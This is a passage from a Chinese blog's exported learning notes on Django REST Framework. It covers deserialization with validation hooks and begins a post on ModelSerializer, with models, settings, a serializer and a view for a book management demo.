<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="反序列层-api-serializers-py"><a href="#反序列层-api-serializers-py" class="headerlink" title="反序列层 api/serializers.py"></a>反序列层 <code>api/serializers.py</code></h4><ol>
<li>设置必填与选填序列化字段，设置校验规则</li>
<li>为需要额外校验的字段提供局部钩子函数，如果该字段不入库，且不参与全局钩子校验，可以将值取出校验 <code>pop</code></li>
<li>为有联合关系的字段们提供全局钩子函数，如果某些字段不入库，可以将值取出校验</li>
<li><strong>必须重写<code>create</code>方法，完成校验通过的数据入库工作，得到新增的对象</strong></li>
</ol>
<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDeserializer</span><span class="params">(serializers.Serializer)</span>:</span></span><br><span class="line">    <span class="comment"># 1) 哪些字段必须反序列化</span></span><br><span class="line">    <span class="comment"># 2) 字段都有哪些安全校验</span></span><br><span class="line">    <span class="comment"># 3) 哪些字段需要额外提供校验  钩子函数</span></span><br><span class="line">    <span class="comment"># 4) 哪些字段间存在联合校验</span></span><br><span class="line">    <span class="comment"># 注：反序列化字段都是用来入库的，不会出现自定义方法属性，会出现可以设置校验规则的自定义属性,不入数据库的</span></span><br><span class="line">    name = serializers.CharField(</span><br><span class="line">        max_length=<span class="number">64</span>,</span><br><span class="line">        min_length=<span class="number">3</span>,</span><br><span class="line">        error_messages=&#123;</span><br><span class="line">            <span class="string">'max_length'</span>: <span class="string">'太长'</span>,</span><br><span class="line">            <span class="string">'min_length'</span>: <span class="string">'太短'</span></span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    pwd = serializers.CharField()</span><br><span class="line">    phone = serializers.CharField(required=<span class="literal">False</span>)</span><br><span class="line">    sex = serializers.IntegerField(required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自定义有校验规则的反序列化字段,例如确认密码字段re_pwd</span></span><br><span class="line">    re_pwd = serializers.CharField(required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 小结：</span></span><br><span class="line">    <span class="comment"># name，pwd，re_pwd为必填字段</span></span><br><span class="line">    <span class="comment"># phone，sex为选填字段</span></span><br><span class="line">    <span class="comment"># 五个字段都必须提供完成的校验规则</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 局部钩子：validate_要校验的字段名(self, 当前要校验字段的值)</span></span><br><span class="line">    <span class="comment"># 校验规则：校验通过返回原值，校验失败，抛出异常</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():  <span class="comment"># 名字中不能出现g</span></span><br><span class="line">            <span class="keyword">raise</span> exceptions.ValidationError(<span class="string">'名字非法，是个鸡贼！'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 全局钩子：validate(self, 通过系统与局部钩子校验之后的所有数据)</span></span><br><span class="line">    <span class="comment"># 校验规则：校验通过返回原值，校验失败，抛出异常</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span>    <span class="comment">#attrs是字典格式</span></span><br><span class="line">        pwd = attrs.get(<span class="string">'pwd'</span>)</span><br><span class="line">        re_pwd = attrs.pop(<span class="string">'re_pwd'</span>)     <span class="comment">#因为re_pwd不需要入数据库，所以在全局钩子校验中删除掉这个字段</span></span><br><span class="line">        <span class="keyword">if</span> pwd != re_pwd:</span><br><span class="line">            <span class="keyword">raise</span> exceptions.ValidationError(&#123;<span class="string">'pwd&amp;re_pwd'</span>: <span class="string">'两次密码不一致'</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 要完成新增，必须自己重写 create 方法，validated_data是校验的数据</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, validated_data)</span>:</span></span><br><span class="line">        <span class="comment"># 尽量在所有校验规则完毕之后，数据可以直接入库</span></span><br><span class="line">        <span class="keyword">return</span> models.User.objects.create(**validated_data)</span><br></pre></td></tr></table></figure>

<h4 id="视图层-views-py-1"><a href="#视图层-views-py-1" class="headerlink" title="视图层 views.py"></a>视图层 views.py</h4><ol>
<li>反序列化数据必须赋值<code>data</code>，结果就是得到一个<code>serializer</code>对象</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">book_ser = serializers.UserDeserializer(data=request_data)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>把数据放到自定义<code>serializer</code>中校验，数据校验成功返回<code>True</code>,失败返回<code>False</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">book_ser.is_valid()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>不通过返回 <code>book_ser.errors</code> 给前台，通过 <code>book_ser.save()</code> 得到新增的对象，再正常返回</li>
</ol>
<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># 只考虑单增</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 请求数据</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        <span class="comment"># 数据是否合法（增加对象需要一个字典数据）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(request_data, dict) <span class="keyword">or</span> request_data == &#123;&#125;:</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'数据有误'</span>,</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="comment"># 数据类型合法，但数据内容不一定合法，需要校验数据，校验(参与反序列化)的数据需要赋值给data</span></span><br><span class="line">        book_ser = serializers.UserDeserializer(data=request_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 序列化对象调用is_valid()完成校验，校验失败的失败信息都会被存储在 序列化对象.errors</span></span><br><span class="line">        <span class="keyword">if</span> book_ser.is_valid():</span><br><span class="line">            <span class="comment"># 校验通过，完成新增</span></span><br><span class="line">            book_obj = book_ser.save()</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">                <span class="string">'results'</span>: serializers.UserSerializer(book_obj).data</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 校验失败</span></span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: book_ser.errors,</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>使用序列化器的时候一定要注意，序列化器声明了以后，不会自动执行，需要我们在视图中进行调用才可以</li>
<li>序列化器无法直接接收数据，需要我们在视图中创建序列化器对象时把使用的数据传递过来。（<code>data</code>, <code>instance</code>传参）<ul>
<li>序列化：是数据对象从数据库中查出，通过instance传入序列化器中，必须通过data属性才能将序列化后的数据传给前端，不能直接传序列化对象</li>
<li>反序列化：是数据是通过request.data从前端获取到数据，通过data传入序列化器中进行校验，保存到数据库中</li>
</ul>
</li>
<li>序列化器的字段声明类似于我们前面使用过的表单系统</li>
<li>开发restful api时，序列化器会帮我们把模型数据转换成字典</li>
<li>drf提供的视图会帮我们把字典转换成json，或者把客户端发过来的数据转换成字典</li>
</ol>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（八）：序列化模块 serialziers 之 ModelSerializer类</title>
    <url>/tech/drf-learning-notes-8-the-modelserializer-class-in-serialziers-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (8): the ModelSerializer class in serialziers module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li>源码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvc2VyaWFsaXplcnMucHk=">rest_framework.serializers<i class="fa fa-external-link-alt"></i></span></li>
<li>官方文档<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guild - Serializers<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guild - Serializer fields<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guild - Serializer relations<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzhfZHJmX01vZGVsU2VyaWFsaXplcg==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>DRF常用序列化类主要有</p>
<ul>
<li><code>rest_framework.serialziers.Serializer</code></li>
<li><code>rest_framework.serialziers.ModelSerializer</code></li>
<li><code>rest_framework.serialziers.ListSerializer</code></li>
</ul>
<p>本篇介绍<code>rest_framework.serialziers.ModelSerializer</code> ，将结合图书管理系统实例说明。</p>
<a id="more"></a>

<h1 id="序列化以外的其他配置"><a href="#序列化以外的其他配置" class="headerlink" title="序列化以外的其他配置"></a>序列化以外的其他配置</h1><h2 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a><code>settings.py</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'rest_framework'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br><span class="line">USE_I18N = <span class="literal">True</span></span><br><span class="line">USE_L10N = <span class="literal">True</span></span><br><span class="line">USE_TZ = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">MEDIA_URL = <span class="string">'/media/'</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'media'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="全局url-py"><a href="#全局url-py" class="headerlink" title="全局url.py"></a>全局<code>url.py</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.conf.urls.static <span class="keyword">import</span> static</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'admin/'</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">'api/'</span>, include(<span class="string">'api.urls'</span>)),</span><br><span class="line">] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)</span><br></pre></td></tr></table></figure>

<h2 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h2><h3 id="表一览"><a href="#表一览" class="headerlink" title="表一览"></a>表一览</h3><ul>
<li><code>BaseModel</code>基表：<code>is_delete</code>、<code>create_time</code></li>
</ul>
<p>下面四表继承基表，可以继承两个字段</p>
<ul>
<li><code>Book</code>表：<code>name</code>、<code>price</code>、<code>img</code>、<code>authors</code>、<code>publish</code>、<code>is_delete</code>、<code>create_time</code></li>
<li><code>Publish</code>表：<code>name</code>、<code>address</code>、<code>is_delete</code>、<code>create_time</code></li>
<li><code>Author表</code>：<code>name</code>、<code>age</code>、<code>is_delete</code>、<code>create_time</code></li>
<li><code>AuthorDetail</code>表：<code>mobile, author</code>、<code>is_delete</code>、<code>create_time</code></li>
</ul>
<h3 id="基表代码"><a href="#基表代码" class="headerlink" title="基表代码"></a>基表代码</h3><p><code>models.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置 abstract = True 来声明基表，作为基表的Model不能在数据库中形成对应的表</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        abstract = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3 id="断关联多表关系（重点）"><a href="#断关联多表关系（重点）" class="headerlink" title="断关联多表关系（重点）"></a>断关联多表关系（重点）</h3><ol>
<li><p>外键位置：</p>
<ul>
<li>一对多：外键放多的一方</li>
<li>一对一：从逻辑正反向考虑，如作者表与作者详情表，作者删除级联作者详情也删除，详情删除作者依旧存在，所以建议外键在详情表中（和之前的一对一关系外键放置不一样，之前都是把外键放在查询频率高的表）</li>
<li>多对多：外键在关系表中</li>
</ul>
</li>
<li><p>ORM正向方向连表查找：(注：依赖代码见下方)</p>
<ul>
<li>正向：通过外键字段 eg: <code>author_detial_obj.author</code>，外键设置在作者详情表，在作者详情表中查询作者直接<code>.author</code>就可以</li>
<li>反向：通过设置反向查询<code>related_name</code>的值 eg：<code>author_obj.detail</code>，外键没有设置在作者表中，在作者表中通过设置反向查询<code>.detail</code>查询作者详情</li>
</ul>
</li>
<li><p>连表操作关系：（注：拿作者与作者详情表举例，外键建在作者详情表中）</p>
<ul>
<li>作者删除，详情级联   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">on_delete=models.CASCADE    <span class="comment">#跟着一起删除</span></span><br></pre></td></tr></table></figure></li>
<li>作者删除，详情置空   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">null=<span class="literal">True</span>, on_delete=models.SET_NULL   <span class="comment">#外键字段清空</span></span><br></pre></td></tr></table></figure></li>
<li>作者删除，详情重置   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">default=<span class="number">0</span>, on_delete=models.SET_DEFAULT</span><br></pre></td></tr></table></figure></li>
<li>作者删除，详情不动   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">on_delete=models.DO_NOTHING</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>外键关联字段的参数：如何实现断关联、目前表间操作关系、方向查询字段</p>
<ol>
<li>作者详情表中的（外键设置在作者详情表中）  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">author = models.OneToOneField(</span><br><span class="line">    to=<span class="string">'Author'</span>,       <span class="comment">#和作者表关联</span></span><br><span class="line">    related_name=<span class="string">'detail'</span>,   <span class="comment">#反查询，作者表直接查作者详情表的电话号码，可以直接author_obj.detail.mobile</span></span><br><span class="line">    db_constraint=<span class="literal">False</span>,     <span class="comment">#断关联</span></span><br><span class="line">    on_delete=models.CASCADE  <span class="comment">#级联删除</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
<li>图书表中的  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">publish = models.ForeignKey(</span><br><span class="line">    to=<span class="string">'Publish'</span>,</span><br><span class="line">    related_name=<span class="string">'books'</span>,</span><br><span class="line">    db_constraint=<span class="literal">False</span>,</span><br><span class="line">    on_delete=models.DO_NOTHING,</span><br><span class="line">)</span><br><span class="line">authors = models.ManyToManyField(</span><br><span class="line">    to=<span class="string">'Author'</span></span><br><span class="line">    related_name=<span class="string">'books'</span>,</span><br><span class="line">    db_constraint=<span class="literal">False</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

</li>
</ol>
</li>
</ol>
<div class="note warning">
            <p>注意：</p><ul><li><code>ManyToManyField</code>不能设置<code>on_delete</code></li><li><code>OneToOneField</code>、<code>ForeignKey</code>必须设置<code>on_delete</code>（django1.x系统默认级联，但是django2.x必须手动明确）</li></ul>
          </div>

<h3 id="各表代码"><a href="#各表代码" class="headerlink" title="各表代码"></a>各表代码</h3><details>

<summary> models.py </summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)  <span class="comment"># 默认不是删除，数据库中是0/1</span></span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置 abstract = True 来声明基表，作为基表的Model不能在数据库中形成对应的表</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        abstract = <span class="literal">True</span>  <span class="comment"># 声明该表只是一个抽象表不出现在数据库中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 书籍表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    price = models.DecimalField(max_digits=<span class="number">5</span>, decimal_places=<span class="number">2</span>)</span><br><span class="line">    img = models.ImageField(upload_to=<span class="string">'img'</span>, default=<span class="string">'default.jpg'</span>)</span><br><span class="line">    <span class="comment"># 关联出版社表</span></span><br><span class="line">    publish = models.ForeignKey(</span><br><span class="line">        to=<span class="string">'Publish'</span>,  <span class="comment"># 关联publish表</span></span><br><span class="line">        db_constraint=<span class="literal">False</span>,  <span class="comment"># 断关联（断开Book表和Publish表的关联,方便删数据,虽然断开了关联但是还能正常使用）</span></span><br><span class="line">        related_name=<span class="string">'books'</span>,  <span class="comment"># 反向查询字段：publish_obj.books就能查出当前出版社出版的的所有书籍</span></span><br><span class="line">        on_delete=models.DO_NOTHING,  <span class="comment"># 设置连表操作关系</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 关联作者表</span></span><br><span class="line">    authors = models.ManyToManyField(</span><br><span class="line">        to=<span class="string">'Author'</span>,</span><br><span class="line">        db_constraint=<span class="literal">False</span>,  <span class="comment"># 断开关联</span></span><br><span class="line">        related_name=<span class="string">'books'</span>,  <span class="comment"># 反向查询字段</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 序列化插拔式属性 - 完成自定义字段名完成连表查询</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">publish_name</span><span class="params">(self)</span>:</span>  <span class="comment"># 自定义查询出版社名字</span></span><br><span class="line">        <span class="keyword">return</span> self.publish.name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">author_list</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.authors.values(<span class="string">'name'</span>, <span class="string">'age'</span>, <span class="string">'detail__mobile'</span>).all()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'book'</span></span><br><span class="line">        verbose_name = <span class="string">'书籍'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">        unique_together = (<span class="string">'name'</span>, <span class="string">'publish'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出版社表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Publish</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""name、address、is_delete、create_time"""</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    address = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'publish'</span></span><br><span class="line">        verbose_name = <span class="string">'出版社'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 作者表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Author</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""name、age、is_delete、create_time"""</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    age = models.IntegerField()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'author'</span></span><br><span class="line">        verbose_name = <span class="string">'作者'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 作者详情</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthorDetail</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""mobile, author、is_delete、create_time"""</span></span><br><span class="line">    mobile = models.CharField(max_length=<span class="number">11</span>)</span><br><span class="line">    author = models.OneToOneField(</span><br><span class="line">        to=<span class="string">'Author'</span>,</span><br><span class="line">        db_constraint=<span class="literal">False</span>,</span><br><span class="line">        related_name=<span class="string">'detail'</span>,</span><br><span class="line">        on_delete=models.CASCADE</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'author_detail'</span></span><br><span class="line">        verbose_name = <span class="string">'作者详情'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.author.name</span><br></pre></td></tr></table></figure>

</details>

<h1 id="serializers-ModelSerializer"><a href="#serializers-ModelSerializer" class="headerlink" title="serializers.ModelSerializer"></a>serializers.ModelSerializer</h1><h2 id="序列化-amp-反序列化"><a href="#序列化-amp-反序列化" class="headerlink" title="序列化 &amp; 反序列化"></a>序列化 &amp; 反序列化</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p><code>ModelSerializer</code>模型类序列化器与常规的<code>Serializer</code>相同，但提供了：</p>
<ol>
<li>基于模型类自动生成一系列字段</li>
<li>包含默认的<code>create()</code>和<code>update()</code>的实现</li>
<li>基于模型类自动为<code>Serializer</code>生成<code>validators</code>，比如<code>unique_together</code></li>
</ol>
<h4 id="序列化层-api-serializers-py"><a href="#序列化层-api-serializers-py" class="headerlink" title="序列化层 api/serializers.py"></a>序列化层 <code>api/serializers.py</code></h4><details>

<summary> <b><i>Source Code</i></b> </summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> ModelSerializer, SerializerMethodField</span><br><span class="line"><span class="keyword">from</span> rest_framework.exceptions <span class="keyword">import</span> ValidationError</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以单独作为Publish接口的序列化类，也可以作为Book序列化外键publish辅助的序列化组件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PublishModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Publish</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'address'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Book接口序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># 了解: 1.还可以自定义设置序列化字段，但是必须在fields中声明，在fields中写publish_address</span></span><br><span class="line">    <span class="comment"># publish_address = SerializerMethodField()</span></span><br><span class="line">    <span class="comment"># def get_publish_address(self, obj):</span></span><br><span class="line">    <span class="comment">#     return obj.publish.address</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 自定义连表深度-子序列化方式-该方式不能参与反序列化，使用在序列化和反序列化共存时，不能书写</span></span><br><span class="line">    publish = PublishModelSerializer()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        <span class="comment"># 序列化类关联的model类</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        <span class="comment"># 参与序列化的字段</span></span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>, <span class="string">'img'</span>, <span class="string">'author_list'</span>, <span class="string">'publish'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 了解知识点</span></span><br><span class="line">        <span class="comment"># 所有字段</span></span><br><span class="line">        <span class="comment"># fields = '__all__'</span></span><br><span class="line">        <span class="comment"># 与fields不共存，exclude排除哪些字段</span></span><br><span class="line">        <span class="comment"># exclude = ('id', 'is_delete', 'create_time')</span></span><br><span class="line">        <span class="comment"># 自动连表深度</span></span><br><span class="line">        <span class="comment"># depth = 1</span></span><br></pre></td></tr></table></figure>

</details>

<h4 id="视图层-views-py"><a href="#视图层-views-py" class="headerlink" title="视图层 views.py"></a>视图层 <code>views.py</code></h4><details>

<summary> <b><i>Source Code</i></b> </summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models,serializers</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="comment"># 单查</span></span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                book_obj = models.Book.objects.get(pk=pk, is_delete=<span class="literal">False</span>)</span><br><span class="line">                book_data = serializers.BookModelSerializer(</span><br><span class="line">                    book_obj).data  <span class="comment"># 单条数据序列化</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'数据不存在'</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="comment"># 群查</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            book_query = models.Book.objects.filter(</span><br><span class="line">                is_delete=<span class="literal">False</span>).all()  <span class="comment"># 先筛选查询,再查所有</span></span><br><span class="line">            book_data = serializers.BookModelSerializer(</span><br><span class="line">                book_query, many=<span class="literal">True</span>).data  <span class="comment"># 不管是一条还是多条，只要数据是被[]嵌套，都要写many=True</span></span><br><span class="line">        <span class="comment"># 返回前端数据</span></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: book_data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

</details>

